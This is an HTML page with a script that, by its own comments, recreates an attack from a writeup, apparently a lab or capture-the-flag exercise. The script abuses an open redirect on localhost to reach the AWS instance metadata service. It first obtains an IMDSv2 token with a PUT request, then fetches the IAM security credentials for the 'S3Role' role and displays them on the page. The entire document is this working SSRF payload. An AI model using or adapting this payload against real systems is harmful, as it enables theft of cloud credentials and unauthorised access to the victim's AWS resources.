<!DOCTYPE html>
<html>
<head>
    <title>Exact Writeup Recreation</title>
</head>
<body>
    <h1>üìù Exact Original Writeup Recreation</h1>
    <div id="tokenResponse"></div>
    <div id="metadataResponse"></div>
    <div id="error"></div>
    
    <script>
        // Recreate the EXACT attack from the original writeup
        var tokenUrl = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
        var metadataURL = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role";
        var xhr = new XMLHttpRequest();
        var token = '';
        
        try {
            // Step 1: Get token using PUT request (exact method from writeup)
            xhr.open('PUT', tokenUrl, false);
            xhr.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
            xhr.send();
            token = xhr.responseText;
            document.getElementById("tokenResponse").innerHTML = "Token: " + token;

            // Step 2: Use token to get S3Role credentials (exact method from writeup)
            xhr.open('GET', metadataURL, false);
            xhr.setRequestHeader('X-aws-ec2-metadata-token', token);
            xhr.send();
            document.getElementById("metadataResponse").innerHTML = xhr.responseText;
            
        } catch(err) {
            document.getElementById('error').innerHTML = err.message;
        }
    </script>
</body>
</html>
